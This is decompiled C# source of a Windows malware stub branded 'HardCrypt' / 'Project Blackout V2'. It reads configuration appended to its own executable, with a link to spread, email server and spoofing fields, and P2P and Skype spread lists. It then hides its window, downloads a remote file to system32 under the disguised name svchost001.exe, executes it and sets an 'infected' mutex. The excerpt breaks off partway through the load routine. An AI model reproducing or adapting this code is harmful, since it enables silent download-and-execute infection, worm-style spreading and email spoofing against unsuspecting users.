using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using ns2;
using ns3;
using ns4;

namespace ns1;

internal class Form1 : Form
{
	private static List<WeakReference> list_0 = new List<WeakReference>();

	private IContainer icontainer_0;

	private BackgroundWorker backgroundWorker_0;

	private Label label_0;

	private TextBox textBox_0;

	private Label label_1;

	private TextBox textBox_1;

	private Label label_2;

	private TextBox textBox_2;

	private Label label_3;

	private TextBox textBox_3;

	private Label label_4;

	private TextBox textBox_4;

	private Label label_5;

	private TextBox textBox_5;

	private TextBox textBox_6;

	private Label label_6;

	private TextBox textBox_7;

	private Label label_7;

	private Label label_8;

	private Label label_9;

	private TextBox textBox_8;

	private TextBox textBox_9;

	private Label label_10;

	private TextBox textBox_10;

	private Label label_11;

	private TextBox textBox_11;

	private Label label_12;

	private Label label_13;

	private string string_0;

	private string[] string_1;

	private Mutex mutex_0;

	private string string_2;

	private string string_3;

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		smethod_0(this);
		string_2 = Environment.UserName + "AVanalysasholesssssssssssststfu";
		string_3 = Environment.UserName + "infectzzzzzzf33313zzzzzed";
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	private static void smethod_0(object object_0)
	{
		checked
		{
			lock (list_0)
			{
				if (list_0.Count == list_0.Capacity)
				{
					int num = 0;
					int num2 = list_0.Count - 1;
					int num3 = 0;
					while (true)
					{
						int num4 = num3;
						int num5 = num2;
						if (num4 > num5)
						{
							break;
						}
						WeakReference weakReference = list_0[num3];
						if (weakReference.IsAlive)
						{
							if (num3 != num)
							{
								list_0[num] = list_0[num3];
							}
							num++;
						}
						num3++;
					}
					list_0.RemoveRange(num, list_0.Count - num);
					list_0.Capacity = list_0.Count;
				}
				list_0.Add(new WeakReference(RuntimeHelpers.GetObjectValue(object_0)));
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && icontainer_0 != null) ? true : false)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	private void InitializeComponent()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Expected O, but got Unknown
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Expected O, but got Unknown
		//IL_0090: Unknown result type (might be due to invalid IL or missing references)
		//IL_009a: Expected O, but got Unknown
		//IL_009b: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a5: Expected O, but got Unknown
		//IL_00a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		//IL_00b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bb: Expected O, but got Unknown
		//IL_00bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c6: Expected O, but got Unknown
		//IL_00c7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d1: Expected O, but got Unknown
		//IL_00d2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00dc: Expected O, but got Unknown
		//IL_00dd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e7: Expected O, but got Unknown
		//IL_00e8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f2: Expected O, but got Unknown
		//IL_00f3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fd: Expected O, but got Unknown
		//IL_00fe: Unknown result type (might be due to invalid IL or missing references)
		//IL_0108: Expected O, but got Unknown
		//IL_0109: Unknown result type (might be due to invalid IL or missing references)
		//IL_0113: Expected O, but got Unknown
		//IL_0114: Unknown result type (might be due to invalid IL or missing references)
		//IL_011e: Expected O, but got Unknown
		//IL_011f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0129: Expected O, but got Unknown
		//IL_0a69: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a73: Expected O, but got Unknown
		//IL_0af3: Unknown result type (might be due to invalid IL or missing references)
		//IL_0afd: Expected O, but got Unknown
		vmethod_0(new BackgroundWorker());
		vmethod_2(new Label());
		vmethod_4(new TextBox());
		vmethod_6(new Label());
		vmethod_8(new TextBox());
		vmethod_10(new Label());
		vmethod_12(new TextBox());
		vmethod_14(new Label());
		vmethod_16(new TextBox());
		vmethod_18(new Label());
		vmethod_20(new TextBox());
		vmethod_22(new Label());
		vmethod_24(new TextBox());
		vmethod_26(new TextBox());
		vmethod_28(new Label());
		vmethod_30(new TextBox());
		vmethod_32(new Label());
		vmethod_34(new Label());
		vmethod_36(new Label());
		vmethod_38(new TextBox());
		vmethod_40(new TextBox());
		vmethod_42(new Label());
		vmethod_44(new TextBox());
		vmethod_46(new Label());
		vmethod_48(new TextBox());
		vmethod_50(new Label());
		vmethod_52(new Label());
		((Control)this).SuspendLayout();
		vmethod_1().set_AutoSize(true);
		Label obj = vmethod_1();
		Point location = new Point(12, 9);
		((Control)obj).set_Location(location);
		((Control)vmethod_1()).set_Name("Label1");
		Label obj2 = vmethod_1();
		Size size = new Size(77, 13);
		((Control)obj2).set_Size(size);
		((Control)vmethod_1()).set_TabIndex(0);
		vmethod_1().set_Text("Link to spread:");
		TextBox obj3 = vmethod_3();
		location = new Point(96, 9);
		((Control)obj3).set_Location(location);
		((Control)vmethod_3()).set_Name("TextBox1");
		vmethod_3().set_PasswordChar('*');
		TextBox obj4 = vmethod_3();
		size = new Size(77, 20);
		((Control)obj4).set_Size(size);
		((Control)vmethod_3()).set_TabIndex(1);
		vmethod_5().set_AutoSize(true);
		Label obj5 = vmethod_5();
		location = new Point(12, 39);
		((Control)obj5).set_Location(location);
		((Control)vmethod_5()).set_Name("Label2");
		Label obj6 = vmethod_5();
		size = new Size(35, 13);
		((Control)obj6).set_Size(size);
		((Control)vmethod_5()).set_TabIndex(2);
		vmethod_5().set_Text("Email:");
		TextBox obj7 = vmethod_7();
		location = new Point(87, 35);
		((Control)obj7).set_Location(location);
		((Control)vmethod_7()).set_Name("TextBox2");
		vmethod_7().set_PasswordChar('*');
		TextBox obj8 = vmethod_7();
		size = new Size(77, 20);
		((Control)obj8).set_Size(size);
		((Control)vmethod_7()).set_TabIndex(3);
		vmethod_9().set_AutoSize(true);
		Label obj9 = vmethod_9();
		location = new Point(12, 68);
		((Control)obj9).set_Location(location);
		((Control)vmethod_9()).set_Name("Label3");
		Label obj10 = vmethod_9();
		size = new Size(56, 13);
		((Control)obj10).set_Size(size);
		((Control)vmethod_9()).set_TabIndex(4);
		vmethod_9().set_Text("Password:");
		TextBox obj11 = vmethod_11();
		location = new Point(87, 65);
		((Control)obj11).set_Location(location);
		((Control)vmethod_11()).set_Name("TextBox3");
		vmethod_11().set_PasswordChar('*');
		TextBox obj12 = vmethod_11();
		size = new Size(77, 20);
		((Control)obj12).set_Size(size);
		((Control)vmethod_11()).set_TabIndex(5);
		vmethod_13().set_AutoSize(true);
		Label obj13 = vmethod_13();
		location = new Point(12, 97);
		((Control)obj13).set_Location(location);
		((Control)vmethod_13()).set_Name("Label4");
		Label obj14 = vmethod_13();
		size = new Size(89, 13);
		((Control)obj14).set_Size(size);
		((Control)vmethod_13()).set_TabIndex(6);
		vmethod_13().set_Text("EMAIL SERVER:");
		TextBox obj15 = vmethod_15();
		location = new Point(107, 97);
		((Control)obj15).set_Location(location);
		((Control)vmethod_15()).set_Name("TextBox4");
		vmethod_15().set_PasswordChar('*');
		TextBox obj16 = vmethod_15();
		size = new Size(77, 20);
		((Control)obj16).set_Size(size);
		((Control)vmethod_15()).set_TabIndex(7);
		vmethod_17().set_AutoSize(true);
		Label obj17 = vmethod_17();
		location = new Point(12, 128);
		((Control)obj17).set_Location(location);
		((Control)vmethod_17()).set_Name("Label5");
		Label obj18 = vmethod_17();
		size = new Size(68, 13);
		((Control)obj18).set_Size(size);
		((Control)vmethod_17()).set_TabIndex(8);
		vmethod_17().set_Text("EMAIL LIST:");
		TextBox obj19 = vmethod_19();
		location = new Point(86, 128);
		((Control)obj19).set_Location(location);
		((Control)vmethod_19()).set_Name("TextBox5");
		vmethod_19().set_PasswordChar('*');
		TextBox obj20 = vmethod_19();
		size = new Size(77, 20);
		((Control)obj20).set_Size(size);
		((Control)vmethod_19()).set_TabIndex(9);
		vmethod_21().set_AutoSize(true);
		Label obj21 = vmethod_21();
		location = new Point(12, 159);
		((Control)obj21).set_Location(location);
		((Control)vmethod_21()).set_Name("Label6");
		Label obj22 = vmethod_21();
		size = new Size(81, 13);
		((Control)obj22).set_Size(size);
		((Control)vmethod_21()).set_TabIndex(10);
		vmethod_21().set_Text("EMAIL SPOOF:");
		TextBox obj23 = vmethod_23();
		location = new Point(107, 159);
		((Control)obj23).set_Location(location);
		((Control)vmethod_23()).set_Name("TextBox6");
		vmethod_23().set_PasswordChar('*');
		TextBox obj24 = vmethod_23();
		size = new Size(77, 20);
		((Control)obj24).set_Size(size);
		((Control)vmethod_23()).set_TabIndex(11);
		TextBox obj25 = vmethod_25();
		location = new Point(107, 185);
		((Control)obj25).set_Location(location);
		((Control)vmethod_25()).set_Name("Textbox11");
		vmethod_25().set_PasswordChar('*');
		TextBox obj26 = vmethod_25();
		size = new Size(77, 20);
		((Control)obj26).set_Size(size);
		((Control)vmethod_25()).set_TabIndex(12);
		vmethod_27().set_AutoSize(true);
		Label obj27 = vmethod_27();
		location = new Point(20, 188);
		((Control)obj27).set_Location(location);
		((Control)vmethod_27()).set_Name("Label7");
		Label obj28 = vmethod_27();
		size = new Size(58, 13);
		((Control)obj28).set_Size(size);
		((Control)vmethod_27()).set_TabIndex(13);
		vmethod_27().set_Text("SUBJECT:");
		TextBox obj29 = vmethod_29();
		location = new Point(107, 211);
		((Control)obj29).set_Location(location);
		((Control)vmethod_29()).set_Name("TextBox7");
		vmethod_29().set_PasswordChar('*');
		TextBox obj30 = vmethod_29();
		size = new Size(77, 20);
		((Control)obj30).set_Size(size);
		((Control)vmethod_29()).set_TabIndex(14);
		vmethod_31().set_AutoSize(true);
		Label obj31 = vmethod_31();
		location = new Point(31, 214);
		((Control)obj31).set_Location(location);
		((Control)vmethod_31()).set_Name("Label8");
		Label obj32 = vmethod_31();
		size = new Size(34, 13);
		((Control)obj32).set_Size(size);
		((Control)vmethod_31()).set_TabIndex(15);
		vmethod_31().set_Text("Body:");
		vmethod_33().set_AutoSize(true);
		Label obj33 = vmethod_33();
		location = new Point(31, 246);
		((Control)obj33).set_Location(location);
		((Control)vmethod_33()).set_Name("Label9");
		Label obj34 = vmethod_33();
		size = new Size(48, 13);
		((Control)obj34).set_Size(size);
		((Control)vmethod_33()).set_TabIndex(16);
		vmethod_33().set_Text("Mutex 1:");
		vmethod_35().set_AutoSize(true);
		Label obj35 = vmethod_35();
		location = new Point(30, 274);
		((Control)obj35).set_Location(location);
		((Control)vmethod_35()).set_Name("Label10");
		Label obj36 = vmethod_35();
		size = new Size(48, 13);
		((Control)obj36).set_Size(size);
		((Control)vmethod_35()).set_TabIndex(17);
		vmethod_35().set_Text("Mutex 2:");
		TextBox obj37 = vmethod_37();
		location = new Point(96, 243);
		((Control)obj37).set_Location(location);
		((Control)vmethod_37()).set_Name("TextBox8");
		vmethod_37().set_PasswordChar('*');
		TextBox obj38 = vmethod_37();
		size = new Size(77, 20);
		((Control)obj38).set_Size(size);
		((Control)vmethod_37()).set_TabIndex(18);
		TextBox obj39 = vmethod_39();
		location = new Point(87, 269);
		((Control)obj39).set_Location(location);
		((Control)vmethod_39()).set_Name("TextBox9");
		vmethod_39().set_PasswordChar('*');
		TextBox obj40 = vmethod_39();
		size = new Size(77, 20);
		((Control)obj40).set_Size(size);
		((Control)vmethod_39()).set_TabIndex(19);
		vmethod_41().set_AutoSize(true);
		Label obj41 = vmethod_41();
		location = new Point(30, 307);
		((Control)obj41).set_Location(location);
		((Control)vmethod_41()).set_Name("Label11");
		Label obj42 = vmethod_41();
		size = new Size(82, 13);
		((Control)obj42).set_Size(size);
		((Control)vmethod_41()).set_TabIndex(20);
		vmethod_41().set_Text("P2P Spread list:");
		TextBox obj43 = vmethod_43();
		location = new Point(118, 304);
		((Control)obj43).set_Location(location);
		((Control)vmethod_43()).set_Name("TextBox10");
		vmethod_43().set_PasswordChar('*');
		TextBox obj44 = vmethod_43();
		size = new Size(77, 20);
		((Control)obj44).set_Size(size);
		((Control)vmethod_43()).set_TabIndex(21);
		vmethod_45().set_AutoSize(true);
		Label obj45 = vmethod_45();
		location = new Point(30, 342);
		((Control)obj45).set_Location(location);
		((Control)vmethod_45()).set_Name("Label12");
		Label obj46 = vmethod_45();
		size = new Size(40, 13);
		((Control)obj46).set_Size(size);
		((Control)vmethod_45()).set_TabIndex(22);
		vmethod_45().set_Text("Skype:");
		TextBox obj47 = vmethod_47();
		location = new Point(96, 342);
		((Control)obj47).set_Location(location);
		((Control)vmethod_47()).set_Name("TextBox12");
		vmethod_47().set_PasswordChar('*');
		TextBox obj48 = vmethod_47();
		size = new Size(77, 20);
		((Control)obj48).set_Size(size);
		((Control)vmethod_47()).set_TabIndex(23);
		vmethod_49().set_AutoSize(true);
		((Control)vmethod_49()).set_Font(new Font("Microsoft Sans Serif", 15.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Label obj49 = vmethod_49();
		location = new Point(241, 27);
		((Control)obj49).set_Location(location);
		((Control)vmethod_49()).set_Name("Label13");
		Label obj50 = vmethod_49();
		size = new Size(313, 25);
		((Control)obj50).set_Size(size);
		((Control)vmethod_49()).set_TabIndex(24);
		vmethod_49().set_Text("HardCrypt Double AES By MH2");
		vmethod_51().set_AutoSize(true);
		((Control)vmethod_51()).set_Font(new Font("Microsoft Sans Serif", 15.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Label obj51 = vmethod_51();
		location = new Point(188, 65);
		((Control)obj51).set_Location(location);
		((Control)vmethod_51()).set_Name("Label14");
		Label obj52 = vmethod_51();
		size = new Size(451, 25);
		((Control)obj52).set_Size(size);
		((Control)vmethod_51()).set_TabIndex(25);
		vmethod_51().set_Text("Project Blackout V2. All rights reserved. 2010.");
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(664, 412);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)vmethod_51());
		((Control)this).get_Controls().Add((Control)(object)vmethod_49());
		((Control)this).get_Controls().Add((Control)(object)vmethod_47());
		((Control)this).get_Controls().Add((Control)(object)vmethod_45());
		((Control)this).get_Controls().Add((Control)(object)vmethod_43());
		((Control)this).get_Controls().Add((Control)(object)vmethod_41());
		((Control)this).get_Controls().Add((Control)(object)vmethod_39());
		((Control)this).get_Controls().Add((Control)(object)vmethod_37());
		((Control)this).get_Controls().Add((Control)(object)vmethod_35());
		((Control)this).get_Controls().Add((Control)(object)vmethod_33());
		((Control)this).get_Controls().Add((Control)(object)vmethod_31());
		((Control)this).get_Controls().Add((Control)(object)vmethod_29());
		((Control)this).get_Controls().Add((Control)(object)vmethod_27());
		((Control)this).get_Controls().Add((Control)(object)vmethod_25());
		((Control)this).get_Controls().Add((Control)(object)vmethod_23());
		((Control)this).get_Controls().Add((Control)(object)vmethod_21());
		((Control)this).get_Controls().Add((Control)(object)vmethod_19());
		((Control)this).get_Controls().Add((Control)(object)vmethod_17());
		((Control)this).get_Controls().Add((Control)(object)vmethod_15());
		((Control)this).get_Controls().Add((Control)(object)vmethod_13());
		((Control)this).get_Controls().Add((Control)(object)vmethod_11());
		((Control)this).get_Controls().Add((Control)(object)vmethod_9());
		((Control)this).get_Controls().Add((Control)(object)vmethod_7());
		((Control)this).get_Controls().Add((Control)(object)vmethod_5());
		((Control)this).get_Controls().Add((Control)(object)vmethod_3());
		((Control)this).get_Controls().Add((Control)(object)vmethod_1());
		((Control)this).set_Name("Form1");
		((Form)this).set_Text("Form1");
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual void vmethod_0(BackgroundWorker backgroundWorker_1)
	{
		backgroundWorker_0 = backgroundWorker_1;
	}

	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual Label vmethod_1()
	{
		return label_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual void vmethod_2(Label label_14)
	{
		label_0 = label_14;
	}

	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual TextBox vmethod_3()
	{
		return textBox_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual void vmethod_4(TextBox textBox_12)
	{
		textBox_0 = textBox_12;
	}

	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual Label vmethod_5()
	{
		return label_1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual void vmethod_6(Label label_14)
	{
		label_1 = label_14;
	}

	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual TextBox vmethod_7()
	{
		return textBox_1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual void vmethod_8(TextBox textBox_12)
	{
		textBox_1 = textBox_12;
	}

	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual Label vmethod_9()
	{
		return label_2;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual void vmethod_10(Label label_14)
	{
		label_2 = label_14;
	}

	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual TextBox vmethod_11()
	{
		return textBox_2;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual void vmethod_12(TextBox textBox_12)
	{
		textBox_2 = textBox_12;
	}

	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual Label vmethod_13()
	{
		return label_3;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual void vmethod_14(Label label_14)
	{
		label_3 = label_14;
	}

	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual TextBox vmethod_15()
	{
		return textBox_3;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual void vmethod_16(TextBox textBox_12)
	{
		textBox_3 = textBox_12;
	}

	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual Label vmethod_17()
	{
		return label_4;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual void vmethod_18(Label label_14)
	{
		label_4 = label_14;
	}

	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual TextBox vmethod_19()
	{
		return textBox_4;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual void vmethod_20(TextBox textBox_12)
	{
		textBox_4 = textBox_12;
	}

	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual Label vmethod_21()
	{
		return label_5;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual void vmethod_22(Label label_14)
	{
		label_5 = label_14;
	}

	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual TextBox vmethod_23()
	{
		return textBox_5;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual void vmethod_24(TextBox textBox_12)
	{
		textBox_5 = textBox_12;
	}

	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual TextBox vmethod_25()
	{
		return textBox_6;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual void vmethod_26(TextBox textBox_12)
	{
		textBox_6 = textBox_12;
	}

	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual Label vmethod_27()
	{
		return label_6;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual void vmethod_28(Label label_14)
	{
		label_6 = label_14;
	}

	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual TextBox vmethod_29()
	{
		return textBox_7;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual void vmethod_30(TextBox textBox_12)
	{
		textBox_7 = textBox_12;
	}

	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual Label vmethod_31()
	{
		return label_7;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual void vmethod_32(Label label_14)
	{
		label_7 = label_14;
	}

	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual Label vmethod_33()
	{
		return label_8;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual void vmethod_34(Label label_14)
	{
		label_8 = label_14;
	}

	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual Label vmethod_35()
	{
		return label_9;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual void vmethod_36(Label label_14)
	{
		label_9 = label_14;
	}

	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual TextBox vmethod_37()
	{
		return textBox_8;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual void vmethod_38(TextBox textBox_12)
	{
		textBox_8 = textBox_12;
	}

	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual TextBox vmethod_39()
	{
		return textBox_9;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual void vmethod_40(TextBox textBox_12)
	{
		textBox_9 = textBox_12;
	}

	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual Label vmethod_41()
	{
		return label_10;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual void vmethod_42(Label label_14)
	{
		label_10 = label_14;
	}

	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual TextBox vmethod_43()
	{
		return textBox_10;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual void vmethod_44(TextBox textBox_12)
	{
		textBox_10 = textBox_12;
	}

	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual Label vmethod_45()
	{
		return label_11;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual void vmethod_46(Label label_14)
	{
		label_11 = label_14;
	}

	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual TextBox vmethod_47()
	{
		return textBox_11;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual void vmethod_48(TextBox textBox_12)
	{
		textBox_11 = textBox_12;
	}

	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual Label vmethod_49()
	{
		return label_12;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual void vmethod_50(Label label_14)
	{
		label_12 = label_14;
	}

	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual Label vmethod_51()
	{
		return label_13;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual void vmethod_52(Label label_14)
	{
		label_13 = label_14;
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public void Form1_Load(object sender, EventArgs e)
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		int num5 = default(int);
		string[] array = default(string[]);
		List<string> list = default(List<string>);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 1089:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_001b;
						case 4:
							goto IL_002f;
						case 5:
							goto IL_0047;
						case 6:
							goto IL_005a;
						case 7:
							goto IL_0074;
						case 8:
							goto IL_0089;
						case 9:
							goto IL_009e;
						case 10:
							goto IL_00b4;
						case 11:
							goto IL_00ca;
						case 12:
							goto IL_00e0;
						case 13:
							goto IL_00f6;
						case 14:
							goto IL_010c;
						case 15:
							goto IL_0122;
						case 16:
							goto IL_0139;
						case 17:
							goto IL_0150;
						case 18:
							goto IL_0167;
						case 19:
							goto IL_017e;
						case 20:
							goto IL_0187;
						case 21:
							goto IL_01b3;
						case 22:
							goto IL_01c1;
						case 23:
							goto IL_01d6;
						case 24:
							goto IL_01eb;
						case 25:
							goto IL_01f9;
						case 26:
						case 27:
						case 28:
							goto IL_0208;
						case 29:
							goto IL_021d;
						case 30:
							goto IL_0232;
						case 31:
							goto IL_0240;
						case 32:
						case 33:
						case 34:
							goto IL_024f;
						case 35:
							goto IL_0264;
						case 39:
							goto IL_0280;
						case 40:
							goto IL_0288;
						case 41:
							goto IL_0295;
						case 42:
							goto IL_029d;
						case 43:
							goto IL_02a5;
						case 44:
							goto IL_02ad;
						case 45:
							goto IL_02b5;
						case 46:
							goto IL_02bd;
						case 47:
							goto IL_02c5;
						case 48:
							goto IL_02ce;
						case 49:
						case 50:
							goto IL_0326;
						case 51:
							goto IL_033c;
						case 36:
						case 37:
						case 38:
						case 52:
							goto IL_0349;
						default:
							goto end_IL_0001;
						case 53:
							goto end_IL_0001_2;
						}
						goto default;
					}
					IL_033c:
					num = 51;
					goto IL_033f;
					IL_033f:
					if (num5 < array.Length)
					{
						num5 = checked(num5 + 1);
						goto IL_033c;
					}
					goto IL_0349;
					IL_0009:
					num = 2;
					FileSystem.FileOpen(1, Application.get_ExecutablePath(), (OpenMode)32, (OpenAccess)1, (OpenShare)(-1), -1);
					goto IL_001b;
					IL_001b:
					num = 3;
					string_0 = Strings.Space(checked((int)FileSystem.LOF(1)));
					goto IL_002f;
					IL_002f:
					num = 4;
					FileSystem.FileGet(1, ref string_0, -1L, false);
					goto IL_0047;
					IL_0047:
					num = 5;
					FileSystem.FileClose(new int[1] { 1 });
					goto IL_005a;
					IL_005a:
					num = 6;
					string_1 = Strings.Split(string_0, "--!ZOMG-A-TUTORIAL!--", -1, (CompareMethod)0);
					goto IL_0074;
					IL_0074:
					num = 7;
					vmethod_3().set_Text(string_1[1]);
					goto IL_0089;
					IL_0089:
					num = 8;
					vmethod_7().set_Text(string_1[2]);
					goto IL_009e;
					IL_009e:
					num = 9;
					vmethod_11().set_Text(string_1[3]);
					goto IL_00b4;
					IL_00b4:
					num = 10;
					vmethod_15().set_Text(string_1[4]);
					goto IL_00ca;
					IL_00ca:
					num = 11;
					vmethod_19().set_Text(string_1[5]);
					goto IL_00e0;
					IL_00e0:
					num = 12;
					vmethod_23().set_Text(string_1[6]);
					goto IL_00f6;
					IL_00f6:
					num = 13;
					vmethod_29().set_Text(string_1[7]);
					goto IL_010c;
					IL_010c:
					num = 14;
					vmethod_37().set_Text(string_1[8]);
					goto IL_0122;
					IL_0122:
					num = 15;
					vmethod_39().set_Text(string_1[9]);
					goto IL_0139;
					IL_0139:
					num = 16;
					vmethod_43().set_Text(string_1[10]);
					goto IL_0150;
					IL_0150:
					num = 17;
					vmethod_25().set_Text(string_1[11]);
					goto IL_0167;
					IL_0167:
					num = 18;
					vmethod_47().set_Text(string_1[12]);
					goto IL_017e;
					IL_017e:
					num = 19;
					((Control)this).Hide();
					goto IL_0187;
					IL_0187:
					num = 20;
					((ServerComputer)Class2.smethod_0()).get_Network().DownloadFile("" + vmethod_3().get_Text(), "C:\\Windows\\system32\\svchost001.exe");
					goto IL_01b3;
					IL_01b3:
					num = 21;
					Process.Start("C:\\Windows\\system32\\svchost001.exe");
					goto IL_01c1;
					IL_01c1:
					num = 22;
					mutex_0 = new Mutex(initiallyOwned: false, string_3);
					goto IL_01d6;
					IL_01d6:
					num = 23;
					if (!mutex_0.WaitOne(0, exitContext: false))
					{
						goto IL_01eb;
					}
